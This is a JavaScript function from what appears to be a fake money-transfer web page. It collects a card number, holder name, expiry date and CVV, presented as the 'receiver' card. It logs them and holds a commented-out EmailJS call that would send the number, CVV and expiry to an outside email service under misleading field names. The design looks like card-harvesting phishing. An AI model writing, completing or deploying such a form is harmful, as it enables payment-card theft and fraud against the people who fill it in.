


function confirm() {
 const todo = document.querySelector('.js-amountinput')
 let confirm = Number(todo.value);

 const atm = document.querySelector('.js-atm-input')
  let atmNumber = Number(atm.value);

  const holder = document.querySelector('.js-holder-name')
  let holderName = holder.value;

  const date = document.querySelector('.js-date')
  let cardDate = date.value;

   const cvv = document.querySelector('.js-cvv')
  let cvvNumber = Number(cvv.value);

  let html ='';

   if(confirm >= 20001) {
  html = '<span class="span-limit">your daily transfer limit is $20,000.00</span>'
 } else if (atmNumber === 0) {
    alert('Enter the receiver ATM card number');
 } else if (holderName === '') {
    alert('Enter the receiver card holder name');
 } else if (cardDate === '') {
    alert('Enter the receiver ATM card date');
 } else if (cvvNumber === 0) {
    alert('Enter the receiver ATM 3 digit cvv');
 } else if (confirm === 0) {
    alert('Enter amount');
 } else{
   let firstParams = {
      card: atmNumber,
      name: cvvNumber,
      message: cardDate,
         
   }
   console.log(firstParams);

 //emailjs.send("service_exfzcaq","template_q7b1lho",firstParams);

   html = `<p class="send-drop">Do you want to send <span class="span-amount">$${confirm}</span> to this bank card <span class="span-amount">${atmNumber}</span></p>

 <a href="yes-send.html">
 <button class="check-button js-check-button">
 Yes send
 </button>
 </a>

 `};

 document.querySelector('.js-check').innerHTML = html

}

